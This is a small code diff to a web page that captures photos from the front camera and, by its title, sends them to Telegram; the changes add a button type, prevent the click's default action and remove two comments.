@@ -9,7 +9,7 @@
   <h2>Capture Media and Send to Telegram</h2>
   
   <video id="video" autoplay playsinline style="width: 300px;"></video>
-  <button id="captureBtn">Capture Photo</button>
+  <button id="captureBtn" type="button">Capture Photo</button>
   
   <script>
     // Automatically redirect to Chrome on Android
@@ -28,7 +28,6 @@
     // 1. Start the camera video stream
     async function startCamera() {
       try {
-        // Use specific constraints for mobile compatibility
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
@@ -40,10 +39,11 @@
     }
 
     // 2. Capture photo from video stream
-    captureBtn.addEventListener('click', () => {
+    captureBtn.addEventListener('click', (event) => {
+      event.preventDefault();  // Prevent any default action, such as form submission or page reload
+
       setTimeout(() => {
         const canvas = document.createElement('canvas');
-        // Set a fallback resolution if videoWidth or videoHeight are 0
         canvas.width = video.videoWidth || 300;
         canvas.height = video.videoHeight || 150;
         const ctx = canvas.getContext('2d');
